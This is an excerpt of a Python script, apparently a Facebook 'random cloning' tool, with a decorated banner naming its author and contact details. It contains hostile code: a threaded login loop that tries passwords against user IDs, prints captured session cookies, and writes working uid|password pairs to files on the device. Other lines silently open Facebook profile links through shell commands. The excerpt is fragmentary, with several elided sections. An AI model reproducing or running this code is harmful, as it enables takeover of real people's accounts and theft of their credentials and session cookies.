...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100088857368236')
logo = ("""
...
\x1b[0;34m᯽⊱┈─╌❊❊╌──┈⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙉𝘼𝙈𝙀\033[38;5;46m        : [★]  𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐇𝐀𝐒𝐀𝐍 
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m    : [★]  ƬƛӇЄƊƲԼ ヽ・　T.T
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙂𝙄𝙏𝙃𝙐𝘽\033[38;5;46m      : [★]  𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐇𝐀𝐒𝐀𝐍      
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[38;5;46m    : [★]  01955749454   
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[38;5;46m  : [★]  RANDOM CLONING  
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\033[38;5;46m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[38;5;46m: [★]  FREE  -𝗩. 0.1    
\x1b[0;34m᯽⊱┈─╌❊❊╌──┈⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱""")
def linex():
	print('\033[38;5;46m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/hasanvau3344?mibextid=ZbWKwL')
    print(logo)
...
try:
    print('\033[38;5;46mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
...
except:print('\033[38;5;46mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m 𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐇𝐀𝐒𝐀𝐍')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\x1b[0;34m[𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐇𝐀𝐒𝐀𝐍-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[38;5;46m COOKIE = \033[38;5;46m'+coki+  '  ''  \033[38;5;46m')
                cek_apk(session,coki)
                open('/sdcard/𝐓~𝐇-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;31m [𝐓~𝐇-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝐓~𝐇-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}𝐓~𝐇{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
